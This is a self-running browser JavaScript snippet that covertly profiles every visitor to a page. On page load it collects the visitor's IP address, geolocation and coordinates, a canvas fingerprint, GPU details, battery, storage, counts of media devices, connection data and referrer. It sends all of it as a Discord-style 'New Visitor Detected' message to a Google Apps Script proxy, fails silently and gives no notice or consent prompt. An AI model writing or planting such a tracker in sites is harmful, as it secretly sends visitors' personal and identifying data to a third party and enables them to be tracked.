(function () {
  "use strict";

  const PROXY = "https://script.google.com/macros/s/AKfycbwA4tEArcM1YIvoMGKxnTHNBPs7ZggglMFH1pCkypCu3BZ1OjTEhgwQCuVpmq1IwtAV/exec";
  const SESSION_KEY = "__v_tracked";

  // Only fire once per session
  if (sessionStorage.getItem(SESSION_KEY)) return;
  sessionStorage.setItem(SESSION_KEY, "1");

  // ── Helpers ──────────────────────────────────────────────

  function hash(str) {
    let h = 0;
    for (let i = 0; i < str.length; i++) {
      h = ((h << 5) - h + str.charCodeAt(i)) | 0;
    }
    return (h >>> 0).toString(16).padStart(8, "0");
  }

  function canvasFingerprint() {
    try {
      const c = document.createElement("canvas");
      const ctx = c.getContext("2d");
      c.width = 200;
      c.height = 50;
      ctx.textBaseline = "top";
      ctx.font = "14px 'Arial'";
      ctx.fillStyle = "#f60";
      ctx.fillRect(50, 0, 100, 30);
      ctx.fillStyle = "#069";
      ctx.fillText("fp:canvas:v2", 2, 15);
      ctx.fillStyle = "rgba(102,204,0,0.7)";
      ctx.fillText("fp:canvas:v2", 4, 17);
      return hash(c.toDataURL());
    } catch (_) {
      return "n/a";
    }
  }

  function webglInfo() {
    try {
      const c = document.createElement("canvas");
      const gl =
        c.getContext("webgl") || c.getContext("experimental-webgl");
      if (!gl) return { vendor: "n/a", renderer: "n/a" };
      const ext = gl.getExtension("WEBGL_debug_renderer_info");
      return {
        vendor: ext
          ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)
          : gl.getParameter(gl.VENDOR),
        renderer: ext
          ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)
          : gl.getParameter(gl.RENDERER),
      };
    } catch (_) {
      return { vendor: "n/a", renderer: "n/a" };
    }
  }

  function detectAdBlocker() {
    return new Promise(function (resolve) {
      const bait = document.createElement("div");
      bait.className =
        "adsbox ad-banner ad-placeholder textad banner_ad pub_300x250";
      bait.style.cssText =
        "position:absolute;top:-9999px;left:-9999px;width:1px;height:1px;";
      document.body.appendChild(bait);
      setTimeout(function () {
        const blocked =
          bait.offsetHeight === 0 ||
          bait.clientHeight === 0 ||
          getComputedStyle(bait).display === "none";
        bait.remove();
        resolve(blocked);
      }, 100);
    });
  }

  function batteryInfo() {
    if (navigator.getBattery) {
      return navigator.getBattery().then(function (b) {
        return {
          level: Math.round(b.level * 100) + "%",
          charging: b.charging ? "Yes" : "No",
        };
      });
    }
    return Promise.resolve(null);
  }

  function connectionInfo() {
    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (!c) return null;
    return {
      type: c.effectiveType || "unknown",
      downlink: c.downlink ? c.downlink + " Mbps" : "unknown",
      rtt: c.rtt != null ? c.rtt + " ms" : "unknown",
      saveData: c.saveData ? "Yes" : "No",
    };
  }

  function storageEstimate() {
    if (navigator.storage && navigator.storage.estimate) {
      return navigator.storage.estimate().then(function (e) {
        const gb = function (b) {
          return (b / 1073741824).toFixed(2) + " GB";
        };
        return { quota: gb(e.quota), usage: gb(e.usage) };
      });
    }
    return Promise.resolve(null);
  }

  function installedPlugins() {
    const list = [];
    if (navigator.plugins) {
      for (let i = 0; i < Math.min(navigator.plugins.length, 10); i++) {
        list.push(navigator.plugins[i].name);
      }
    }
    return list.length > 0 ? list.join(", ") : "None detected";
  }

  function mediaDevices() {
    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
      return navigator.mediaDevices.enumerateDevices().then(function (devices) {
        const counts = { audioinput: 0, audiooutput: 0, videoinput: 0 };
        devices.forEach(function (d) {
          if (counts[d.kind] !== undefined) counts[d.kind]++;
        });
        return counts;
      });
    }
    return Promise.resolve(null);
  }

  // ── Flag emoji ────────────────────────────────────────────

  function countryFlag(code) {
    if (!code || code.length !== 2) return "🌐";
    return String.fromCodePoint(
      ...[...code.toUpperCase()].map(function (c) {
        return 0x1f1e6 + c.charCodeAt(0) - 65;
      })
    );
  }

  // ── Truncate for Discord field limits ─────────────────────

  function trunc(s, max) {
    if (!s) return "n/a";
    return s.length > max ? s.substring(0, max - 1) + "…" : s;
  }

  // ── Main ──────────────────────────────────────────────────

  async function collect() {
    // IP + Geo
    let geo = {};
    try {
      const r = await fetch("https://ipapi.co/json/");
      geo = await r.json();
    } catch (_) {
      geo = {};
    }

    const [adBlock, battery, storage, media] = await Promise.all([
      detectAdBlocker(),
      batteryInfo(),
      storageEstimate(),
      mediaDevices(),
    ]);

    const gl = webglInfo();
    const conn = connectionInfo();
    const fp = canvasFingerprint();
    const now = new Date();

    // ── Build Discord embed ─────────────────────────────────

    const flag = countryFlag(geo.country_code);
    const loc = [geo.city, geo.region, geo.country_name]
      .filter(Boolean)
      .join(", ");

    const fields = [];

    // ─ Network ─
    fields.push({
      name: "🌐 IP Address",
      value: "```" + (geo.ip || "unknown") + "```",
      inline: true,
    });
    fields.push({
      name: flag + " Location",
      value: trunc(loc || "unknown", 100),
      inline: true,
    });
    fields.push({
      name: "📡 ISP / Org",
      value: trunc(geo.org || "unknown", 100),
      inline: true,
    });
    if (geo.asn) {
      fields.push({
        name: "🏷️ ASN",
        value: String(geo.asn),
        inline: true,
      });
    }
    if (geo.latitude && geo.longitude) {
      fields.push({
        name: "📍 Coordinates",
        value:
          "[" +
          geo.latitude +
          ", " +
          geo.longitude +
          "](https://maps.google.com/?q=" +
          geo.latitude +
          "," +
          geo.longitude +
          ")",
        inline: true,
      });
    }

    // ─ Device ─
    fields.push({
      name: "🖥️ Screen",
      value:
        screen.width +
        "×" +
        screen.height +
        " · " +
        screen.colorDepth +
        "-bit · " +
        (devicePixelRatio || 1) +
        "x DPR",
      inline: true,
    });
    fields.push({
      name: "⚙️ Hardware",
      value:
        (navigator.hardwareConcurrency || "?") +
        " cores · " +
        (navigator.deviceMemory ? navigator.deviceMemory + " GB RAM" : "RAM n/a"),
      inline: true,
    });
    fields.push({
      name: "🎮 GPU",
      value: trunc(gl.renderer, 100),
      inline: true,
    });
    if (gl.vendor !== "n/a") {
      fields.push({
        name: "🏭 GPU Vendor",
        value: trunc(gl.vendor, 100),
        inline: true,
      });
    }

    // ─ Browser ─
    fields.push({
      name: "🌍 Language",
      value: navigator.language || "n/a",
      inline: true,
    });
    fields.push({
      name: "🕐 Timezone",
      value: Intl.DateTimeFormat().resolvedOptions().timeZone || "n/a",
      inline: true,
    });
    fields.push({
      name: "🍪 Cookies",
      value: navigator.cookieEnabled ? "✅ Enabled" : "❌ Disabled",
      inline: true,
    });
    fields.push({
      name: "🚫 Do-Not-Track",
      value: navigator.doNotTrack === "1" ? "⚠️ Enabled" : "Off",
      inline: true,
    });
    fields.push({
      name: "🛡️ Ad-Blocker",
      value: adBlock ? "⚠️ Detected" : "Not detected",
      inline: true,
    });
    fields.push({
      name: "🔌 Plugins",
      value: trunc(installedPlugins(), 200),
      inline: false,
    });

    // ─ Connection ─
    if (conn) {
      fields.push({
        name: "📶 Connection",
        value:
          conn.type.toUpperCase() +
          " · ↓" +
          conn.downlink +
          " · RTT " +
          conn.rtt +
          (conn.saveData === "Yes" ? " · 🔋 Data Saver" : ""),
        inline: false,
      });
    }

    // ─ Battery ─
    if (battery) {
      fields.push({
        name: "🔋 Battery",
        value: battery.level + (battery.charging === "Yes" ? " ⚡ Charging" : ""),
        inline: true,
      });
    }

    // ─ Storage ─
    if (storage) {
      fields.push({
        name: "💾 Storage",
        value: storage.usage + " / " + storage.quota,
        inline: true,
      });
    }

    // ─ Media Devices ─
    if (media) {
      fields.push({
        name: "🎤 Media Devices",
        value:
          "🎙️ " +
          media.audioinput +
          " mic · 🔊 " +
          media.audiooutput +
          " spk · 📷 " +
          media.videoinput +
          " cam",
        inline: false,
      });
    }

    // ─ Navigation ─
    fields.push({
      name: "🔗 Page",
      value: trunc(document.title + "\n" + location.href, 200),
      inline: false,
    });
    if (document.referrer) {
      fields.push({
        name: "↩️ Referrer",
        value: trunc(document.referrer, 200),
        inline: false,
      });
    }

    // ─ Fingerprint ─
    fields.push({
      name: "🔑 Canvas Fingerprint",
      value: "`" + fp + "`",
      inline: true,
    });

    // ─ Platform ─
    fields.push({
      name: "💻 Platform",
      value: navigator.platform || "n/a",
      inline: true,
    });

    // ─ Touch ─
    fields.push({
      name: "👆 Touch",
      value: navigator.maxTouchPoints > 0
        ? "✅ " + navigator.maxTouchPoints + " points"
        : "❌ No touch",
      inline: true,
    });

    // ── Send to Google Apps Script proxy ─────────────────────

    const payload = {
      embeds: [
        {
          title: "👁️ New Visitor Detected",
          color: 0x5865f2,
          fields: fields,
          footer: {
            text:
              "🕐 " +
              now.toUTCString() +
              " | UA: " +
              trunc(navigator.userAgent, 150),
          },
          timestamp: now.toISOString(),
        },
      ],
    };

    try {
      // Google Apps Script web app requires 'no-cors' mode for POST
      // but using regular fetch with redirect follow works for doPost
      await fetch(PROXY, {
        method: "POST",
        headers: { "Content-Type": "text/plain" },
        body: JSON.stringify(payload),
        mode: "no-cors",
      });
    } catch (_) {
      // Silently fail
    }
  }

  // Fire after DOM is ready
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", collect);
  } else {
    collect();
  }
})();
